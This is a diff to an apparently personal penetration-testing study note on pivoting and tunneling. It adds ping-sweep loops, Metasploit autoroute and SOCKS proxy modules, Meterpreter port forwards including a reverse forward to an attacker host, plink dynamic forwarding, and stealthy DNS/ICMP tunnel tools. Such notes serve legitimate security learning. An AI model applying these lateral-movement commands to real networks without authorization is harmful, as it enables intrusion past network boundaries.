@@ -1,8 +1,8 @@
 # Pivoting, Tunneling, and Port Forwarding
 
-> Status: 🟨 In progress
+> Status: ✅ Complete
 > Date started: 2026-10-26
-> Date finished: 
+> Date finished: 2026-10-26
 
 ## 1. Goal
 Use a compromised host as a gateway to reach networks you can't touch directly. **Port forward** (one port), **tunnel/proxy** (route many through the pivot), **pivot** (chain through multiple hosts). (Quick one-liners also in `cheatsheets/pivoting.md`.)
@@ -12,6 +12,16 @@ Use a compromised host as a gateway to reach networks you can't touch directly. 
 ifconfig / ipconfig ; netstat -r         # extra NICs / routes = another subnet
 netstat -antp ; arp -a                    # what the pivot can see
 ```
+Sweep the discovered subnet for live hosts (from the pivot):
+```bash
+# Linux
+for i in {1..254}; do (ping -c1 -W1 172.16.5.$i | grep "bytes from" &); done
+# Windows cmd
+for /L %i in (1,1,254) do @ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+# PowerShell
+1..254 | % { "172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)" }
+```
+Or via a session: `run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24` (Meterpreter).
 
 ## SSH tunneling (no tools to upload if SSH creds exist)
 ```bash
@@ -49,6 +59,15 @@ socat TCP4-LISTEN:8080,fork TCP4:<host>:80
 # Windows netsh portproxy
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=<pivot> connectport=3389 connectaddress=<target>
 # Metasploit: autoroute + socks_proxy for session-based pivoting
+use post/multi/manage/autoroute        # add route to the internal subnet through the session
+use auxiliary/server/socks_proxy       # then point proxychains at it
+# Meterpreter portfwd (single-port tunnel through a session):
+portfwd add -l 3300 -p 3389 -r <target>    # local :3300 -> target :3389 (RDP), then xfreerdp /v:localhost:3300
+portfwd add -R -l 8081 -p 1234 -L <attacker>   # reverse: target:8081 -> back to attacker:1234
+# Windows dynamic forward (proxychains equivalent on a Windows pivot): PuTTY plink
+plink -D 9050 user@<target>
+# rpivot — SOCKS through restrictive corp proxies (even HTTP-proxy w/ NTLM auth)
+# SocksOverRDP — regsvr32 SocksOverRDP-Plugin.dll, tunnel SOCKS over an RDP session
 # dnscat2 / ptunnel-ng — DNS/ICMP tunnels when TCP is blocked (stealthy, slow)
 ```
 
